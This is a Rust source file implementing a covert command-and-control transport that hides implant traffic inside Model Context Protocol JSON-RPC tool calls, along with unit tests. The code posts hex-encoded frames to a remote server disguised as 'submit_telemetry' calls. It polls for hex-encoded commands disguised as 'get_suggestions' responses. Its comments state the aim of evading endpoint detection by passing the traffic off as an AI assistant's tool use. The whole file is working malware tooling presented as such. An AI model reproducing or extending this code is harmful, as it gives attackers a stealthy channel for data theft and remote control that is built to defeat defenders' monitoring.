//! MCP C2 transport — Model Context Protocol JSON-RPC channel.
//!
//! Anthropic introduced MCP in 2024 as the standard AI-tool interface. Every
//! modern AI agent speaks JSON-RPC over HTTPS to an MCP server — tool calls,
//! resource reads, prompt templates. This channel tunnels C2 frames inside
//! MCP `tools/call` invocations: an EDR sees "AI assistant calling a tool,"
//! not "C2 beacon." Zero detection rules exist for this technique (July 2026).
//!
//! ## Protocol
//! - `send`: POST JSON-RPC `tools/call` with method `submit_telemetry`,
//!   hex-encoded frame as the `data` argument.
//! - `recv`: POST JSON-RPC `tools/call` with method `get_suggestions`,
//!   parse the result content block for a hex-encoded frame.
//! - `health_check`: POST JSON-RPC `initialize`, measure RTT.
//!
//! ## JSON-RPC payload shape
//! ```json
//! {"jsonrpc":"2.0","method":"tools/call","params":{"name":"submit_telemetry",
//!  "arguments":{"data":"<hex>"}},"id":42}
//! ```

use std::time::{Duration, Instant};

use ureq::Agent;

use crate::traits::{Transport, TransportError};

// ---- Constants -------------------------------------------------------------

const JSONRPC_VERSION: &str = "2.0";
const TOOL_SEND: &str = "submit_telemetry";
const TOOL_RECV: &str = "get_suggestions";
const MAX_FRAME: usize = 64 * 1024; // 64 KiB — conservative for HTTP body limits
const RECV_POLL_INTERVAL_MS: u64 = 500;

// ---- McpTransport ----------------------------------------------------------

/// Covert C2 channel tunnelled through MCP (Model Context Protocol) JSON-RPC.
///
/// Every MCP client speaks JSON-RPC 2.0 over HTTPS to a server. Tool calls
/// are the core interaction — `tools/list` to discover, `tools/call` to invoke.
/// This transport disguises C2 frames as ordinary tool invocations:
///
/// - **Outbound** (`send`): frame → hex → `submit_telemetry` tool call with
///   `arguments.data`. Looks like the AI agent is uploading sensor readings.
/// - **Inbound** (`recv`): `get_suggestions` tool call → parse the result
///   content block → hex-decode → frame. Looks like the AI agent is fetching
///   analysis suggestions.
///
/// The JSON-RPC `id` field increments monotonically, matching real MCP
/// client behavior (clients never reuse ids within a session).
pub struct McpTransport {
    server_url: String,
    session_id: String,
    agent: Agent,
    request_id: u64,
}

impl McpTransport {
    /// Create a new MCP transport channel.
    ///
    /// `server_url` is the MCP server endpoint (e.g. `https://mcp.example.com`).
    /// `session_id` is a unique session identifier — the server uses it to
    /// correlate requests from the same implant session.
    pub fn new(server_url: String, session_id: String) -> Self {
        Self {
            server_url,
            session_id,
            agent: Agent::new(),
            request_id: 0,
        }
    }

    // ---- internal helpers --------------------------------------------------

    /// Build a JSON-RPC 2.0 request body for a tool call.
    fn tool_call_body(&mut self, name: &str, arguments: serde_json::Value) -> serde_json::Value {
        self.request_id += 1;
        ureq::json!({
            "jsonrpc": JSONRPC_VERSION,
            "method": "tools/call",
            "params": {
                "name": name,
                "arguments": arguments,
            },
            "id": self.request_id,
        })
    }

    /// Build a JSON-RPC 2.0 request body for a notification (no `id` field).
    fn notification_body(name: &str, params: serde_json::Value) -> serde_json::Value {
        ureq::json!({
            "jsonrpc": JSONRPC_VERSION,
            "method": name,
            "params": params,
        })
    }

    /// POST a JSON-RPC request to the MCP server and return the parsed result.
    fn rpc_call(
        &self,
        body: serde_json::Value,
    ) -> Result<serde_json::Value, TransportError> {
        let resp = self
            .agent
            .post(&self.server_url)
            .set("Content-Type", "application/json")
            .timeout(Duration::from_secs(30))
            .send_json(body)
            .map_err(|e| {
                if e.to_string().contains("timed out") {
                    TransportError::Timeout
                } else {
                    TransportError::Transient("MCP RPC transport error")
                }
            })?;

        let json: serde_json::Value = resp.into_json().map_err(|_| {
            TransportError::Transient("MCP RPC response parse error")
        })?;

        // JSON-RPC error object → channel error.
        if json.get("error").is_some() {
            return Err(TransportError::Transient("MCP RPC error"));
        }

        Ok(json)
    }

    /// Extract a hex block from the MCP result content.
    ///
    /// MCP `tools/call` results return `{ "content": [{ "type": "text", "text": "..." }] }`.
    /// We scan the text for the longest run of consecutive hex digits (≥ 8 chars).
    fn extract_hex(text: &str) -> Option<String> {
        let mut longest: Option<&str> = None;
        let mut run_start: Option<usize> = None;

        for (i, c) in text.char_indices() {
            if c.is_ascii_hexdigit() {
                if run_start.is_none() {
                    run_start = Some(i);
                }
            } else if let Some(s) = run_start.take() {
                let run = &text[s..i];
                if run.len() >= 8 && longest.map_or(true, |l| run.len() > l.len()) {
                    longest = Some(run);
                }
            }
        }
        // Flush any run that extends to the end.
        if let Some(s) = run_start {
            let run = &text[s..];
            if run.len() >= 8 && longest.map_or(true, |l| run.len() > l.len()) {
                longest = Some(run);
            }
        }

        longest.map(|s| s.to_string())
    }

    /// Parse the `result.content[0].text` field from the JSON-RPC response.
    fn result_text(json: &serde_json::Value) -> Option<&str> {
        json.get("result")?
            .get("content")?
            .as_array()?
            .first()?
            .get("text")?
            .as_str()
    }
}

// ---- Transport impl --------------------------------------------------------

impl Transport for McpTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > self.max_frame_size() {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        let hex_data = hex::encode(frame);

        let body = self.tool_call_body(
            TOOL_SEND,
            ureq::json!({
                "data": hex_data,
                "session": self.session_id,
            }),
        );

        let _resp = self.rpc_call(body)?;
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);

        loop {
            let body = self.tool_call_body(
                TOOL_RECV,
                ureq::json!({
                    "session": self.session_id,
                }),
            );

            match self.rpc_call(body) {
                Ok(json) => {
                    if let Some(text) = Self::result_text(&json) {
                        if let Some(hex_ct) = Self::extract_hex(text) {
                            let frame = hex::decode(&hex_ct).map_err(|_| {
                                TransportError::Transient("MCP recv: invalid hex in response")
                            })?;
                            return Ok(frame);
                        }
                    }
                    // No data in this response — poll again if time remains.
                }
                Err(TransportError::Timeout) => {
                    // Timeout on a poll is fine; just try again.
                }
                Err(e) => return Err(e),
            }

            if Instant::now() >= deadline {
                return Err(TransportError::Timeout);
            }
            std::thread::sleep(Duration::from_millis(RECV_POLL_INTERVAL_MS));
        }
    }

    fn health_check(&self) -> Option<u64> {
        let start = Instant::now();
        let body = Self::notification_body(
            "initialize",
            ureq::json!({
                "protocolVersion": JSONRPC_VERSION,
                "capabilities": {},
                "clientInfo": {
                    "name": "mcp-c2-client",
                    "version": "1.0.0",
                },
            }),
        );

        match self.rpc_call(body) {
            Ok(_) => Some(start.elapsed().as_millis() as u64),
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "mcp"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }

    fn requires_probe(&self) -> bool {
        true
    }

    fn init(&mut self) -> Result<(), TransportError> {
        self.health_check()
            .map(|_| ())
            .ok_or(TransportError::Dead("MCP server unreachable — initialize failed"))
    }
}

// ---- Tests ----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn name_is_mcp() {
        let t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
        assert_eq!(t.name(), "mcp");
    }

    #[test]
    fn max_frame_size_is_64k() {
        let t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
        assert_eq!(t.max_frame_size(), 64 * 1024);
    }

    #[test]
    fn oversized_frame_rejected() {
        let mut t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
        let big = vec![0u8; 65 * 1024];
        match t.send(&big) {
            Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, 65 * 1024),
            other => panic!("expected PayloadTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn request_id_increments() {
        let mut t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
        let b1 = t.tool_call_body("test", ureq::json!({}));
        let b2 = t.tool_call_body("test", ureq::json!({}));
        let b3 = t.tool_call_body("test", ureq::json!({}));
        assert_eq!(b1["id"], 1);
        assert_eq!(b2["id"], 2);
        assert_eq!(b3["id"], 3);
    }

    #[test]
    fn tool_call_body_is_valid_jsonrpc() {
        let mut t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
        let body = t.tool_call_body("submit_telemetry", ureq::json!({ "data": "deadbeef" }));

        assert_eq!(body["jsonrpc"], "2.0");
        assert_eq!(body["method"], "tools/call");
        assert_eq!(body["params"]["name"], "submit_telemetry");
        assert_eq!(body["params"]["arguments"]["data"], "deadbeef");
        assert_eq!(body["id"], 1);
    }

    #[test]
    fn extract_hex_finds_longest_run() {
        let text = "some text abc123 more def45678 trailing";
        let result = McpTransport::extract_hex(text);
        assert_eq!(result, Some("def45678".to_string()));
    }

    #[test]
    fn extract_hex_requires_min_8_chars() {
        let text = "short abc123";
        assert_eq!(McpTransport::extract_hex(text), None);
    }

    #[test]
    fn extract_hex_no_data() {
        assert_eq!(McpTransport::extract_hex("no hex here"), None);
    }

    #[test]
    fn extract_hex_end_of_text() {
        let text = "result: deadbeefcafebabe";
        assert_eq!(
            McpTransport::extract_hex(text),
            Some("deadbeefcafebabe".to_string())
        );
    }

    #[test]
    fn result_text_parses_correctly() {
        let json = ureq::json!({
            "result": {
                "content": [
                    { "type": "text", "text": "deadbeefcafebabe" }
                ]
            }
        });
        assert_eq!(
            McpTransport::result_text(&json),
            Some("deadbeefcafebabe")
        );
    }

    #[test]
    fn result_text_missing_field() {
        let json = ureq::json!({ "result": { "content": [] } });
        assert_eq!(McpTransport::result_text(&json), None);
    }
}
